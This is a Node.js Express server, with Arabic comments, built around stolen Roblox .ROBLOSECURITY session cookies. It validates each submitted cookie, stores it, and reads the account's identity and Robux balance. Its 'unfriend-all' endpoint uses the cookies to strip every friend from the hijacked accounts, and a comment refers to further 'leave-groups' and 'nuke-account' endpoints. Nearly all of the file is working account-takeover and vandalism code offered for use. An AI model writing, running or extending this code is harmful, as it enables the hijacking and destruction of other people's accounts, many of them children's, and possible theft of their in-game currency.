const express = require('express');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

let activeCookies = [];

// دالة لتنظيف الكوكي من النصوص الإضافية
function cleanCookie(rawCookie) {
    // البحث عن .ROBLOSECURITY= متبوعاً بقيمة حتى النهاية أو مسافة
    const match = rawCookie.match(/\.ROBLOSECURITY=([A-F0-9]+)/i);
    if (match && match[1]) {
        return match[1];
    }
    // إذا لم يوجد النمط، نعتبر أن المستخدم أدخل القيمة فقط
    return rawCookie.trim();
}

// دالة جلب معلومات المستخدم من الكوكي
async function getUserInfo(cookie) {
    const cleaned = cleanCookie(cookie);
    try {
        const authRes = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: { 'Cookie': `.ROBLOSECURITY=${cleaned}` }
        });
        const user = authRes.data;
        // جلب الرصيد
        let robux = 0;
        try {
            const robuxRes = await axios.get('https://economy.roblox.com/v1/users/currency', {
                headers: { 'Cookie': `.ROBLOSECURITY=${cleaned}` }
            });
            robux = robuxRes.data.robux;
        } catch (e) {
            console.log('Could not fetch robux:', e.message);
        }
        return {
            id: user.id,
            name: user.name,
            displayName: user.displayName,
            robux: robux,
            location: 'غير متاح',
            birthday: 'غير معروف',
            gender: 'غير محدد',
            pinEnabled: false,
            emailVerified: user.emailVerified || false,
            ageVerified: user.ageVerified || false
        };
    } catch (error) {
        console.error('Error fetching user info:', error.response?.data || error.message);
        return null;
    }
}

// نقطة إضافة الكوكي
app.post('/api/add-cookie', async (req, res) => {
    const { cookie } = req.body;
    if (!cookie) {
        return res.status(400).json({ success: false, message: 'لم يتم إرسال كوكي' });
    }
    const userData = await getUserInfo(cookie);
    if (userData) {
        // تخزين الكوكي النظيف فقط
        const cleaned = cleanCookie(cookie);
        activeCookies.push({ cookie: cleaned, userData });
        res.json({ success: true, user: userData });
    } else {
        res.status(401).json({ success: false, message: 'Cookie غير صالح أو منتهي الصلاحية' });
    }
});

// نقطة جلب معلومات الحساب
app.post('/api/cookie-info', async (req, res) => {
    const { cookie } = req.body;
    if (!cookie) {
        return res.status(400).json({ error: 'لم يتم إرسال كوكي' });
    }
    const info = await getUserInfo(cookie);
    if (info) {
        res.json(info);
    } else {
        res.status(401).json({ error: 'Cookie غير صالح' });
    }
});

// باقي النقاط (leave-groups, unfriend-all, nuke-account, إلخ) تبقى كما هي
// ولكن يجب تعديلها لاستخدام cleaned cookie.

// مثال لتعديل unfriend-all
app.post('/api/unfriend-all', async (req, res) => {
    const { cookies } = req.body;
    let results = [];
    for (const rawCookie of cookies) {
        const cookie = cleanCookie(rawCookie);
        // احصل على معرف المستخدم
        const userInfo = await getUserInfo(cookie);
        if (!userInfo) continue;
        const userId = userInfo.id;
        try {
            // جلب قائمة الأصدقاء
            const friendsRes = await axios.get(`https://friends.roblox.com/v1/users/${userId}/friends`);
            const friends = friendsRes.data.data;
            for (const friend of friends) {
                try {
                    await axios.post(`https://friends.roblox.com/v1/users/${friend.id}/unfriend`, {}, {
                        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
                    });
                    results.push({ friend: friend.id, success: true });
                } catch (e) {
                    results.push({ friend: friend.id, success: false, error: e.message });
                }
            }
        } catch (error) {
            results.push({ error: error.message });
        }
    }
    res.json({ success: true, results });
});

// ... باقي endpoints مشابهة مع استخدام cleanCookie

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
